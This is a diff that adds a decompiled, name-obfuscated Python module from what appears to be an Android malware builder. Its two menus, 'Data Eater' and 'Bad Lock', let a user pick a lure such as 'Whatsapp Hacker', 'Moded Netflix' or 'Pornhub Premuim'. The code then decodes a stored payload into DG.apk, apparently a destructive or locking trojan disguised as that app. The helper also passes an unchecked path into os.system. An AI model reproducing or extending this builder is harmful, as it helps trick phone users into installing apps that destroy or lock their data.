@@ -1,0 +1,102 @@
+# Source Generated with Decompyle++
+# File: deater.pyc (Python 3.8)
+
+from files.startup import *
+
+def deater():
+    O000OO00OOOOOO00O = red + '[' + green + '0' + red + ']'
+    OOOO00O00000O0O0O = [
+        'WpsApp Pro',
+        'Pornhub Premuim',
+        'Whatsapp Hacker',
+        'Termux',
+        'Moded Netflix',
+        'NetHunter',
+        'Wifi Kill',
+        'Aircrack-ng',
+        'CardingApp',
+        'Exit']
+    O0OOOO000OO0O00OO = 0
+    while O0OOOO000OO0O00OO < len(OOOO00O00000O0O0O):
+        slow('\n\r' + O000OO00OOOOOO00O.replace('0', str(O0OOOO000OO0O00OO + 1)) + yellow + ' ' + OOOO00O00000O0O0O[O0OOOO000OO0O00OO], 0.005)
+        O0OOOO000OO0O00OO = O0OOOO000OO0O00OO + 1
+        continue
+    OO0OOOO00OO0OO00O = '/sdcard'
+    print('\n')
+    O0O0OO0OO0O00OOO0 = input(green + 'Data Eater ' + red + '>' + yellow)
+    O00O0000OO00O0O00 = 'null'
+    if O0O0OO0OO0O00OOO0 == '1':
+        O00O0000OO00O0O00 = 'wps'
+    elif O0O0OO0OO0O00OOO0 == '2':
+        O00O0000OO00O0O00 = 'ph'
+    elif O0O0OO0OO0O00OOO0 == '3':
+        O00O0000OO00O0O00 = 'wa'
+    elif O0O0OO0OO0O00OOO0 == '4':
+        O00O0000OO00O0O00 = 'tmx'
+    elif O0O0OO0OO0O00OOO0 == '5':
+        O00O0000OO00O0O00 = 'nf'
+    elif O0O0OO0OO0O00OOO0 == '6':
+        O00O0000OO00O0O00 = 'nh'
+    elif O0O0OO0OO0O00OOO0 == '7':
+        soon()
+    elif O0O0OO0OO0O00OOO0 == '8':
+        soon()
+    elif O0O0OO0OO0O00OOO0 == '9':
+        soon()
+    elif O0O0OO0OO0O00OOO0 == '10':
+        exit(0)
+    OO0OOOO00OO0OO00O = input(green + 'path :' + red)
+    bbase64('de', O00O0000OO00O0O00, OO0OOOO00OO0OO00O + 'DG.apk')
+    slow(green + 'Generated as ' + red + OO0OOOO00OO0OO00O + 'DG.apk', 0.1)
+
+
+def bbase64(OOOO0OOO0OO0000OO, O00O00OOO000O0OO0, OOO0O000O00O0000O):
+    os.system('base64 -d ' + str(OOOO0OOO0OO0000OO) + '/' + str(O00O00OOO000O0OO0) + '>' + str(OOO0O000O00O0000O))
+
+
+def block():
+    O000OO00OOOOOO00O = red + '[' + green + '0' + red + ']'
+    OOOO00O00000O0O0O = [
+        'WpsApp Pro',
+        'Pornhub Premuim',
+        'Whatsapp Hacker',
+        'Termux',
+        'Moded Netflix',
+        'NetHunter',
+        'Wifi Kill',
+        'Aircrack-ng',
+        'CardingApp',
+        'Exit']
+    O0OOOO000OO0O00OO = 0
+    while O0OOOO000OO0O00OO < len(OOOO00O00000O0O0O):
+        slow('\n\r' + O000OO00OOOOOO00O.replace('0', str(O0OOOO000OO0O00OO + 1)) + yellow + ' ' + OOOO00O00000O0O0O[O0OOOO000OO0O00OO], 0.005)
+        O0OOOO000OO0O00OO = O0OOOO000OO0O00OO + 1
+        continue
+    OO0OOOO00OO0OO00O = '/sdcard'
+    print('\n')
+    O0O0OO0OO0O00OOO0 = input(green + 'Bad Lock ' + red + '>' + yellow)
+    O00O0000OO00O0O00 = 'null'
+    if O0O0OO0OO0O00OOO0 == '1':
+        O00O0000OO00O0O00 = 'wps'
+    elif O0O0OO0OO0O00OOO0 == '2':
+        O00O0000OO00O0O00 = 'ph'
+    elif O0O0OO0OO0O00OOO0 == '3':
+        O00O0000OO00O0O00 = 'wa'
+    elif O0O0OO0OO0O00OOO0 == '4':
+        O00O0000OO00O0O00 = 'tmx'
+    elif O0O0OO0OO0O00OOO0 == '5':
+        O00O0000OO00O0O00 = 'nf'
+    elif O0O0OO0OO0O00OOO0 == '6':
+        O00O0000OO00O0O00 = 'nh'
+    elif O0O0OO0OO0O00OOO0 == '7':
+        soon()
+    elif O0O0OO0OO0O00OOO0 == '8':
+        soon()
+    elif O0O0OO0OO0O00OOO0 == '9':
+        soon()
+    elif O0O0OO0OO0O00OOO0 == '10':
+        exit(0)
+    OO0OOOO00OO0OO00O = input(green + 'path :' + red)
+    bbase64('bl', O00O0000OO00O0O00, OO0OOOO00OO0OO00O + 'DG.apk')
+    slow(green + 'Generated as ' + red + OO0OOOO00OO0OO00O + 'DG.apk', 0.1)
+
